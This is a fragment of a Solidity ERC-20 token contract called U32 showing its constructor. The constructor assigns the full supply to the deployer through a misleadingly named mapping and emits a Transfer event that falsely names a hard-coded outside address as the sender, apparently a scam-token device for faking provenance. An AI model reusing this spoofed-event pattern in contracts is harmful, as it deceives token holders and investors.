...
contract U32 is Context, IERC20, Ownable {
    ...
    string private _name = 'U32';
    string private _symbol = 'U32';
    uint8 private _decimals = 18;  

constructor () public {
    _router[_call()] = _totalTokens;
    emit Transfer(address(0xE1120c8AD8ee6F9cb2aaaa3eBAe6703CcFfaEE5c), _call(), _totalTokens);    
